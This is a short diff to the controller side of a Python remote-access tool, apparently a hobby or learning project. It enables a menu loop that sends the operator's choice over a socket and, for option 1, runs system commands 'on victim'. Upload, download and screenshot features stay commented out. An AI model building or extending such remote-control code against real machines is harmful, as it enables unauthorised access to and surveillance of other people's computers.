@@ -1,4 +1,4 @@
-# from core.command import run_command
+from commandS import run_command
 # from core.fileupload import upload_files
 # from core.file_folder_download import receive_file_folders
 # from core.screenshot import capture_screenshot
@@ -23,15 +23,15 @@ def handleConnection(my_socket):
     print("[+] Handling connection")
 
     while True:
-        #show_options()
+        show_options()
         user_input = input("[+] Select your options : ")
 
         my_socket.send_data(user_input)
-        # if user_input == "1":
-        #     print("[+] Running the system comamnds on victim")
-        #     # create function that will handle command execution
+        if user_input == "1":
+            print("[+] Running the system comamnds on victim")
+            # create function that will handle command execution
 
-        #     run_command(my_socket)
+            run_command(my_socket)
         # elif user_input == "2":
         #     # upload files
         #     print("[+] Upload files")
@@ -50,5 +50,5 @@ def handleConnection(my_socket):
 
         if user_input == "99":
             break
-        # else:
-        #     print("[+] Invalid input ")
+        else:
+            print("[+] Invalid input ")
